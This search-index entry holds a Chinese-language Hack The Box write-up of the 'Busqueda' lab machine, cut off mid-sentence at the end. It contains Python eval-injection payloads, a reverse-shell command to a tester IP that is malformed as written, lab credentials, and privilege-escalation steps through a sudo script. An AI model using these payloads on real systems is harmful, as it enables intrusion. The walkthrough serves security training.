<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Busqueda</title>
    <link href="/2023/04/27/HTB-Busqueda/"/>
    <url>/2023/04/27/HTB-Busqueda/</url>
    
    <content type="html"><![CDATA[<h1 id="Busqueda"><a href="#Busqueda" class="headerlink" title="Busqueda"></a>Busqueda</h1><h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><p>Rate : EASY<br>OS : Linux</p><p>主要考察python中eval函数的基本知识，docker inspect 涉及的go模板语法。此外还需要了解利用相对路径执行脚本可能导致的隐患。</p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><ul><li>nmap –min-rate 10000 -p- -oN nmap&#x2F;ports 10.10.11.208<figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.11.208</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">27</span>s latency).<br><span class="hljs-attribute">Not</span> shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br><span class="hljs-attribute">PORT</span>   STATE SERVICE<br><span class="hljs-attribute">22</span>/tcp open  ssh<br><span class="hljs-attribute">80</span>/tcp open  http<br><br><span class="hljs-attribute">Nmap</span> done at Tue Apr <span class="hljs-number">11</span> <span class="hljs-number">18</span>:<span class="hljs-number">58</span>:<span class="hljs-number">24</span> <span class="hljs-number">2023</span> -- <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">8</span>.<span class="hljs-number">16</span> seconds<br></code></pre></td></tr></table></figure></li><li>nmap -sT -sV -O -p22,80 -sC -oN nmap&#x2F;detail 10.10.11.208</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span><br>Host is up (<span class="hljs-number">0.27</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0<span class="hljs-number">.1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>\| ssh-hostkey:<br>\|   <span class="hljs-number">256</span> <span class="hljs-number">4</span>fe3a667a227f9118dc30ed773a02c28 (ECDSA)<br>|\_  <span class="hljs-number">256</span> <span class="hljs-number">816e78766</span>b8aea7d1babd436b7f8ecc4 (ED25519)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.52</span><br>|\<span class="hljs-title">_http-title</span>: Did <span class="hljs-keyword">not</span> follow redirect <span class="hljs-built_in">to</span> &lt;<span class="hljs-keyword">http</span>://searcher.htb/&gt;<br>|\<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.52</span> (Ubuntu)<br>Warning: OSScan results may be unreliable because we could <span class="hljs-keyword">not</span> find <span class="hljs-keyword">at</span> least <span class="hljs-number">1</span> <span class="hljs-built_in">open</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> closed port<br>Aggressive OS guesses: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.6</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.3</span> - <span class="hljs-number">5.4</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">2.6</span><span class="hljs-number">.32</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.0</span> - <span class="hljs-number">5.3</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">95</span>%), AXIS <span class="hljs-number">210</span>A <span class="hljs-keyword">or</span> <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span><span class="hljs-number">.17</span>) (<span class="hljs-number">94</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">5.0</span> (<span class="hljs-number">93</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">2</span> hops<br>Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o\:linux\:linux\<span class="hljs-title">_kernel</span><br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> &lt;<span class="hljs-keyword">https</span>://nmap.org/submit/&gt; .<br><br><span class="hljs-comment"># Nmap done at Tue Apr 11 18:59:54 2023 -- 1 IP address (1 host up) scanned in 21.76 seconds</span><br></code></pre></td></tr></table></figure><ul><li>nmap –script&#x3D;vuln -p22,80 -oN nmap&#x2F;vuln 10.10.11.208</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 1c">PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><span class="hljs-string">|*http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br>\<span class="hljs-string">| http-csrf:</span><br>\<span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=searcher.htb</span><br>\<span class="hljs-string">|   Found the following possible CSRF vulnerabilities:</span><br><span class="hljs-string">|\</span><br>\<span class="hljs-string">|     Path: &lt;http://searcher.htb:80/&gt;</span><br>\<span class="hljs-string">|     Form id: engine-select</span><br><span class="hljs-string">|*    Form action: /search</span><br>http-dombased-xss: Couldn&#x27;t find any DOM based XSS.<br></code></pre></td></tr></table></figure><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><ul><li>访问 <a href="http://10.10.11.208/">http://10.10.11.208</a> ，自动跳转到 <a href="http://searcher.htb/">http://searcher.htb/</a> 。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/1.png" alt="image.png"></p><ul><li>由于无法解析该域名，导致无法访问。在&#x2F;etc&#x2F;hosts中添加<code>10.10.11.208    searcher.htb</code>后，再次访问该网站。在首页底部发现该网站存在flask和 <a href="https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.0">Searchor 2.4.0</a>。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/2.png" alt="image.png"></li></ul><h2 id="User-Privilege"><a href="#User-Privilege" class="headerlink" title="User Privilege"></a>User Privilege</h2><ul><li>Google搜索发现 Searchor 2.4.0 版本存在代码执行漏洞。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/3.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">engine, query, <span class="hljs-built_in">open</span>, copy</span>):<br><span class="hljs-keyword">try</span>:<br>url = <span class="hljs-built_in">eval</span>(<br><span class="hljs-string">f&quot;Engine.<span class="hljs-subst">&#123;engine&#125;</span>.search(&#x27;<span class="hljs-subst">&#123;query&#125;</span>&#x27;, copy\_url=<span class="hljs-subst">&#123;copy&#125;</span>, open\_web=<span class="hljs-subst">&#123;<span class="hljs-built_in">open</span>&#125;</span>)&quot;</span><br>)<br>click.echo(url)<br>searchor.history.update(engine, query, url)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">open</span>:<br>click.echo(<span class="hljs-string">&quot;opening browser...&quot;</span>)<br><span class="hljs-keyword">if</span> copy:<br>click.echo(<span class="hljs-string">&quot;link copied to clipboard&quot;</span>)<br><span class="hljs-keyword">except</span> AttributeError:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;engine not recognized&quot;</span>)<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/sunxb10/article/details/81036693">Python f-string介绍</a></p><p>根据f-string 的特性，先利用用户输入生成eval的表达式，然后再使用eval执行表达式。<br>eval函数会执行作为参数的表达式，<a href="https://realpython.com/python-eval-function/">具体细节请参考该链接</a>，此处是执行search函数。<br>根据如下例子可知，如果search函数内部还有函数，那么也会被执行。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/4.png" alt="image.png"></p><p>对于输入参数query并没有检查，因此我可以构造一个payload：<code>dd&#39;+str(__import__(&#39;os&#39;).system(&#39;whoami&#39;)))#</code></p><p>如果shell命令执行成功则会返回0，拼接在<code>dd</code>后面。本地尝试成功，但是在目标机器上失败。这是由于url编码问题，会将<code>+</code>视为空格，所以导致不成功。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/5.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/6.png" alt="image.png"></p><ul><li>换一个字符串拼接方式，payload：<code>dd&#39;.join(str(__import__(&#39;os&#39;).system(&#39;whoami&#39;))))#</code></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/7.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/8.png" alt="image.png"></p><ul><li><p>在本地和目标机器都能成功执行</p></li><li><p>读取用户flag<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/9.png" alt="image.png"></p></li></ul><h2 id="Root-Privilege"><a href="#Root-Privilege" class="headerlink" title="Root Privilege"></a>Root Privilege</h2><ul><li>由于当前用户svc的权限很小，尝试使用curl从kali上获取反弹shell脚本并通过管道符传给bash。<br><code>bash -c &quot;bash -i &gt;&amp; 10.10.14.34/10001 0&gt;&amp;1&quot;</code></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/10.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/11.png" alt="image.png"></p><ul><li>在.git目录中发现敏感信息。获得一个子域名 <code>gitea.searcher.htb</code> ，以及该网站的账号信息 <code>cody:jh1usoih2bkjaspwe92</code></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/12.png" alt="image.png"></p><ul><li><p>尝试使用ssh登录发现，用户svc的系统账号信息<code>svc:jh1usoih2bkjaspwe92</code></p></li><li><p><code>sudo -l</code> 发现可以以root权限执行<code>/opt/scripts/system-checkup.py</code>，但是无法查看该脚本具体内容。为了提权，现在需要获得该脚本的内容。</p></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/13.png" alt="image.png"></p><ul><li>尝试执行该命令，发现有三个action可选择执行</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Usage: /<span class="hljs-keyword">opt</span>/scripts/<span class="hljs-built_in">system</span>-checkup.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;action&gt;</span> (arg1) (arg2)<br>     docker-<span class="hljs-keyword">ps</span>     : List running docker containers<br>     docker-inspect : Inpect <span class="hljs-keyword">a</span> certain docker container<br>     full-checkup  : Run <span class="hljs-keyword">a</span> full <span class="hljs-built_in">system</span> checkup<br></code></pre></td></tr></table></figure><ul><li>执行<code>docker-ps</code>，发现目标机器上运行的两个容器：<code>gite</code>a和<code>mysql_db</code>。<code>gitea</code>应该跟刚才发现的子域名有关，<code>mysql_db</code>可能存储了子域名网站相关数据。</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> python3 /opt/scripts/system-checkup.py docker-ps<br><span class="hljs-attribute">CONTAINER</span> ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES<br><span class="hljs-attribute">960873171e2e</span>   gitea/gitea:latest   <span class="hljs-string">&quot;/usr/bin/entrypoint…&quot;</span>   <span class="hljs-number">3</span> months ago   Up <span class="hljs-number">3</span> hours   <span class="hljs-number">127.0.0.1:3000</span>-&gt;<span class="hljs-number">3000</span>/tcp, <span class="hljs-number">127.0.0.1:222</span>-&gt;<span class="hljs-number">22</span>/tcp   gitea<br><span class="hljs-attribute">f84a6b33fb5a</span>   mysql:<span class="hljs-number">8</span>              <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">3</span> months ago   Up <span class="hljs-number">3</span> hours   <span class="hljs-number">127.0.0.1:3306</span>-&gt;<span class="hljs-number">3306</span>/tcp, <span class="hljs-number">33060</span>/tcp               mysql_db<br></code></pre></td></tr></table></figure><ul><li>执行<code>full-checkup</code>，发现报错了。由于没有源码，存疑。</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> /<span class="hljs-keyword">opt</span>/scripts/<span class="hljs-built_in">system</span>-checkup.<span class="hljs-keyword">py</span> full-checkup<br>Something went wrong<br></code></pre></td></tr></table></figure><ul><li>执行<code> docker-inspect</code>其中<code>--format=&#123;&#123;&#125;&#125;</code>是go模板的语法，所以直接使用<code>.</code>获取全部上下文，为了便于查看，采用json格式输出。分别获取两个容器的元数据，其中发现敏感信息。</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> /<span class="hljs-keyword">opt</span>/scripts/<span class="hljs-built_in">system</span>-checkup.<span class="hljs-keyword">py</span> docker-inspect <span class="hljs-string">&quot;&#123;&#123;json .&#125;&#125;&quot;</span> gitea| jq<br>...<br><span class="hljs-string">&quot;Env&quot;</span>: [<br>      <span class="hljs-string">&quot;USER_UID=115&quot;</span>,<br>      <span class="hljs-string">&quot;USER_GID=121&quot;</span>,<br>      <span class="hljs-string">&quot;GITEA__database__DB_TYPE=mysql&quot;</span>,<br>      <span class="hljs-string">&quot;GITEA__database__HOST=db:3306&quot;</span>,<br>      <span class="hljs-string">&quot;GITEA__database__NAME=gitea&quot;</span>,<br>      <span class="hljs-string">&quot;GITEA__database__USER=gitea&quot;</span>,<br>      <span class="hljs-string">&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;</span>,<br>      <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>      <span class="hljs-string">&quot;USER=git&quot;</span>,<br>      <span class="hljs-string">&quot;GITEA_CUSTOM=/data/gitea&quot;</span><br>    ],<br>...<br><br>sudo <span class="hljs-keyword">python3</span> /<span class="hljs-keyword">opt</span>/scripts/<span class="hljs-built_in">system</span>-checkup.<span class="hljs-keyword">py</span> docker-inspect <span class="hljs-string">&quot;&#123;&#123;json .&#125;&#125;&quot;</span> mysql_db| jq<br>...<br><span class="hljs-string">&quot;Env&quot;</span>: [<br>      <span class="hljs-string">&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;</span>,<br>      <span class="hljs-string">&quot;MYSQL_USER=gitea&quot;</span>,<br>      <span class="hljs-string">&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;</span>,<br>      <span class="hljs-string">&quot;MYSQL_DATABASE=gitea&quot;</span>,<br>      <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>      <span class="hljs-string">&quot;GOSU_VERSION=1.14&quot;</span>,<br>      <span class="hljs-string">&quot;MYSQL_MAJOR=8.0&quot;</span>,<br>      <span class="hljs-string">&quot;MYSQL_VERSION=8.0.31-1.el8&quot;</span>,<br>      <span class="hljs-string">&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;</span><br>    ],<br>...<br></code></pre></td></tr></table></figure><ul><li><p>整理一下思路。目前已知以下用户名和密码。从这里开始有两条路可以探索，gitea网站和mysql数据库。但是不要忘了核心目的是为了得到 <code>/opt/scripts/system-checkup.py</code> 的源码，便于使用 <code>suid</code> 提权。（当然，如果可以直接获取root密码更好）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elixir">system username<br>    svc\<span class="hljs-symbol">:jh1usoih2bkjaspwe92</span><br>    <span class="hljs-symbol">root:</span><br><br>gitea username<br>    cody\<span class="hljs-symbol">:jh1usoih2bkjaspwe92</span><br>    <span class="hljs-symbol">administrator:</span><br><br>mysql username<br>    gitea\<span class="hljs-symbol">:yuiu1hoiu4i5ho1uh</span><br>    root\<span class="hljs-symbol">:jI86kGUuj87guWr3RyF</span><br></code></pre></td></tr></table></figure></li><li><p>先访问一下网站试试。修改host,访问gitea.searcher.htb，并使用cody账号登陆。发现还存在administrator账户，由于权限问题，无法访问其仓库。</p></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/14.png" alt="image.png"></p><ul><li>cody的仓库里面就是searcher网站源码，由此可以推测 administrator 的仓库里可能存在 <code>/opt/scripts/system-checkup.py</code> 的源码。现在的想法是获取 administrator 的密码从而有权访问其仓库。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/15.png" alt="image.png"></p><ul><li><p>直接root登录一下数据库：<code>mysql -u root -h 127.0.0.1 -p</code></p></li><li><p>查看gitea数据库中的user表，发现加密算法是pbkdf2,这长度看着就不好搞。:（一时陷入僵局。</p></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/16.png" alt="image.png"></p><ul><li>迷茫一段时间之后，突然发现每个用户都有 <code>is_admin</code> 属性，尝试直接使用sql语句修改cody的权限。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/17.png" alt="image.png"></p><ul><li>刷新网页，发现了一个网站管理入口。其中发现了 administrator 的仓库 scripts</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/18.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/19.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/20.png" alt="image.png"></p><ul><li>获得 <code>/opt/scripts/system-checkup.py</code> 的代码如下。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#!/bin/bash</span><br>import subprocess<br>import sys<br><br>actions = [<span class="hljs-string">&#x27;full-checkup&#x27;</span>, <span class="hljs-string">&#x27;docker-ps&#x27;</span>,<span class="hljs-string">&#x27;docker-inspect&#x27;</span>]<br><br>def run_command(arg_list):<br>    r = subprocess.run(arg_list, capture_output=True)<br>    <span class="hljs-keyword">if</span> r.stderr:<br>        output = r.stderr.decode()<br>    <span class="hljs-keyword">else</span>:<br>        output = r.stdout.decode()<br><br>    return output<br><br>def process_action(action):<br>    <span class="hljs-keyword">if</span> action == <span class="hljs-string">&#x27;docker-inspect&#x27;</span>:<br>        try:<br>            _format = sys.argv[<span class="hljs-number">2</span>]<br>            <span class="hljs-keyword">if</span> len(_format) == <span class="hljs-number">0</span>:<br>                print(f<span class="hljs-string">&quot;Format can&#x27;t be empty&quot;</span>)<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br>            container = sys.argv[<span class="hljs-number">3</span>]<br>            arg_list = [<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;--format&#x27;</span>, _format, container]<br>            print(run_command(arg_list)) <br>        except IndexError:<br>            print(f<span class="hljs-string">&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;</span>)<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br>        except Exception as e:<br>            print(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br>    elif action == <span class="hljs-string">&#x27;docker-ps&#x27;</span>:<br>        try:<br>            arg_list = [<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;ps&#x27;</span>]<br>            print(run_command(arg_list)) <br>        except:<br>            print(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br>    elif action == <span class="hljs-string">&#x27;full-checkup&#x27;</span>:<br>        try:<br>            arg_list = [<span class="hljs-string">&#x27;./full-checkup.sh&#x27;</span>]<br>            print(run_command(arg_list))<br>            print(<span class="hljs-string">&#x27;[+] Done!&#x27;</span>)<br>        except:<br>            print(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br>            <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    try:<br>        action = sys.argv[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> action <span class="hljs-keyword">in</span> actions:<br>            process_action(action)<br>        <span class="hljs-keyword">else</span>:<br>            raise IndexError<br>    except IndexError:<br>        print(f<span class="hljs-string">&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;     docker-ps     : List running docker containers&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;     docker-inspect : Inpect a certain docker container&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;     full-checkup  : Run a full system checkup&#x27;</span>)<br>        print(<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li><code>./full-checkup.sh</code> 脚本如下</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#!<span class="hljs-regexp">/bin/</span>bash<br><br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[=] Docker conteainers&#x27;</span><br><br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker ps -s -q|/u</span>sr<span class="hljs-regexp">/bin/</span>xargs -I &#123;&#125; <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker inspect --format=&#x27;&#123; &#123;&#123;json .Name&#125;&#125; : &#123;&#123;json .State.Status&#125;&#125; &#125;&#x27; &#123;&#125;|/u</span>sr<span class="hljs-regexp">/bin/</span>jq<br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[=] Docker port mappings&#x27;</span><br><br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker inspect gitea --format=&#x27;&#123;&#123;json .NetworkSettings.Ports&#125;&#125;&#x27;|/u</span>sr<span class="hljs-regexp">/bin/</span>jq<br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;&#x27;</span><br>#!<span class="hljs-regexp">/bin/</span>bash<br><br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[=] Apache webhosts&#x27;</span><br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/wget http:/</span><span class="hljs-regexp">/searcher.htb/</span> -T <span class="hljs-number">3</span> -O <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> -q<br><span class="hljs-keyword">if</span> [[ $? -eq <span class="hljs-string">&quot;0&quot;</span> ]]; then<br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[+] searcher.htb is up&#x27;</span><br><span class="hljs-keyword">else</span><br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[-] searcher.htb is down&#x27;</span><br>fi<br><br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/wget http:/</span><span class="hljs-regexp">/gitea.searcher.htb/</span> -T <span class="hljs-number">3</span> -O <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> -q<br><span class="hljs-keyword">if</span> [[ $? -eq <span class="hljs-string">&quot;0&quot;</span> ]]; then<br>        <span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[+] gitea.searcher.htb is up&#x27;</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[-] gitea.searcher.htb is down&#x27;</span><br>fi<br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">&#x27;[=] PM2 processes&#x27;</span><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>pm2 list<br></code></pre></td></tr></table></figure><ul><li>在家目录中创建一个 